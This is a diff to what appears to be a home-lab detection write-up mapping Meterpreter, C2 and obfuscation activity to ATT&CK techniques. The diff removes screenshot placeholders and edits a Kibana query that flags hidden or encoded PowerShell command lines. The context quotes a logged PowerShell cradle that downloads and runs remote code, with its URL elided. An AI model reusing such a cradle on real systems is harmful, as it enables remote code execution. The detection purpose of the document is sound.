@@ -99,8 +99,6 @@ ScriptBlockText: IEX (New-Object Net.WebClient).DownloadString(...)
 
 **Evidence:**
 
-> Add screenshot: active Meterpreter session on Kali as LAB\Administrator
-
 ![T1059.001 - Meterpreter Session](evidence/03-meterpreter-session.png)
 
 ---
@@ -116,12 +114,6 @@ DestinationPort: 443
 Image: powershell.exe
 DestinationIp: 192.168.10.102
 ```
-
-**Evidence:**
-
-> Add screenshot: network event in Kibana showing the HTTPS connection from powershell.exe to Kali
-
-![T1071.001 - C2 HTTPS Connection](evidence/04-c2-https.png)
 
 ---
 
@@ -142,14 +134,12 @@ ScriptBlockText: contains the decoded payload
 
 **SIEM Detection:**
 ```
-data.win.eventdata.commandLine:*bypass* OR
+data.win.eventdata.commandLine:*hidden* OR
 data.win.eventdata.commandLine:*encodedcommand* OR
 data.win.eventdata.commandLine:*-enc*
 ```
 
 **Evidence:**
-
-> Add screenshot: Kibana alert for T1027 with the commandLine field showing -ep bypass
 
 ![T1027 - Obfuscation Alert](evidence/05-obfuscation-alert.png)
 
